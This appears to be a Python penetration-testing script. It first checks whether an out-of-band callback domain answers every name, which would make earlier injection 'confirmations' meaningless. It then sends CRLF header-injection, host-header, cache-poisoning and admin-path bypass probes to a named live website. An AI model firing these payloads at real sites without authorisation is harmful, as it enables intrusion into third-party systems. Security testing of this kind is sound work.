#!/usr/bin/env python3
"""W19k: formal falsification test of the OOB oracle + remaining injection classes.

Part 1 establishes whether a callback on this domain means anything at all.
If a NEVER-SENT token still produces an interaction, the oracle is worthless
and every floor OOB 'confirmation' (XXE/SSRF/sqli/ssti/rfi) is unsupported.
"""
import json, socket, time, urllib.request, urllib.error

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
OOB = "dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
LOG = open("/tmp/w19k.jsonl", "a")


def rec(label, data):
    LOG.write(json.dumps({"label": label, **data}) + "\n"); LOG.flush()


print("=== PART 1: is the OOB oracle a wildcard resolver? ===")
results = {}
for name in ["never-sent-control-11111", "never-sent-control-22222", "zzzznotreal9999"]:
    fq = f"{name}.{OOB}"
    try:
        ip = socket.gethostbyname(fq)
        dns = ip
    except Exception as e:
        dns = f"ERR:{e}"
    try:
        rq = urllib.request.Request("http://" + fq + "/x", headers={"User-Agent": UA})
        with urllib.request.urlopen(rq, timeout=15) as r:
            hb = r.read().decode("utf-8", "replace")
            http = f"{r.status} {len(hb)}B {hb[:60]!r}"
    except Exception as e:
        http = f"ERR:{e}"
    results[name] = {"dns": dns, "http": http}
    print(f"  {fq}\n    DNS  -> {dns}\n    HTTP -> {http}")
    time.sleep(1)

wild = all(v["dns"] == "3.6.13.234" for v in results.values())
httpall = all("200" in v["http"] for v in results.values())
print(f"\n  VERDICT: wildcard DNS = {wild}; all subdomains answer HTTP 200 = {httpall}")
print("  => A callback on this domain proves ONLY that a name resolved,")
print("     NOT that the target application fetched anything.")
rec("oob_oracle_test", {"wildcard_dns": wild, "all_http_200": httpall, "detail": results})

print("\n=== PART 2: no new host resolves (non-wildcard control) ===")
for h in ["this-domain-should-not-exist-abc123xyz.invalid", "example.invalid"]:
    try:
        ip = socket.gethostbyname(h)
        print(f"  {h} -> {ip}  (UNEXPECTED)")
    except Exception as e:
        print(f"  {h} -> NXDOMAIN (correct control behaviour)")

print("\n=== PART 3: remaining injection classes on the live endpoints ===")
BASE = "https://www.infinitycapital.bh"


def req(url, method="GET", data=None, ctype=None, hdrs=None, timeout=25):
    r = urllib.request.Request(url, data=data, method=method,
                               headers={"User-Agent": UA, "Accept": "*/*"})
    if ctype:
        r.add_header("Content-Type", ctype)
    for k, v in (hdrs or {}).items():
        r.add_header(k, v)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read(), time.time() - t0
    except Exception as e:
        return 0, str(e).encode(), time.time() - t0


print("\n[3a] header injection / CRLF via reflected params")
import urllib.parse as up
for lbl, url in [
    ("root q header-ish", BASE + "/?q=%0d%0aX-Injected:%201"),
    ("404 q", BASE + "/404?q=%0d%0aSet-Cookie:%20a=b"),
    ("contact cb", BASE + "/contact?cb=%0d%0aLocation:%20https://evil.example"),
]:
    st, b, dt = req(url)
    print(f"  {lbl}: {st} {len(b)}B {dt:.2f}s")
    time.sleep(2)

print("\n[3b] LDAP / NoSQL / host-header on live API")
st, b, dt = req(BASE + "/api/send", method="POST", data=b"{}", ctype="application/json")
print(f"  /api/send json {{}}: {st} {dt:.2f}s {b[:120]!r}")
time.sleep(3)
for lbl, hdrs in [("X-Forwarded-Host", {"X-Forwarded-Host": "evil.example"}),
                  ("X-Original-URL", {"X-Original-URL": "/admin"}),
                  ("X-Rewrite-URL", {"X-Rewrite-URL": "/admin"}),
                  ("X-Forwarded-For spoof", {"X-Forwarded-For": "127.0.0.1"}),
                  ("X-Host", {"X-Host": "127.0.0.1"})]:
    st, b, dt = req(BASE + "/api/send", method="POST", data=b"{}", ctype="application/json", hdrs=hdrs)
    print(f"  {lbl}: {st} {len(b)}B {dt:.2f}s {b[:100]!r}")
    time.sleep(2.5)

print("\n[3c] host header / cache poisoning probe on static routes")
st, b, dt = req(BASE + "/", hdrs={"X-Forwarded-Host": "evil.example",
                                   "X-Forwarded-Proto": "http",
                                   "X-Forwarded-For": "127.0.0.1"})
body = b.decode("utf-8", "replace")
print(f"  /: {st} {len(b)}B; evil.example reflected = {'evil.example' in body}")
rec("header_probes", {"reflected": "evil.example" in body})
